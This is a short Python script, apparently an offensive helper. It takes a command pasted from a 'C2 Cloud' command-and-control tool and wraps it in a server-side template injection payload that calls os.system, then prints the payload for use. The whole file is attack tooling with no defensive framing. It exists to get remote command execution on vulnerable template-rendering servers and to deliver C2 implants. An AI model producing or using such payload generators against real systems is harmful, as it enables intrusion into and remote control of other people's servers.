import os

# cli color codes 
color_white = '\u001b[37m'
color_green = '\u001b[32m'
color_red = '\u001b[31m'
line_override = '\033[F\033[K'

c2_payload = input("\n{}Enter payload copied from C2 Cloud: {}".format(color_green, color_white))

c2_payload = c2_payload.replace('"', '\\"')

payload = '''{% import os %}{{ os.system("'''+ c2_payload + '''") }}'''

print("\n{}SSTI payload: {}{}\n".format(color_green, color_white, payload))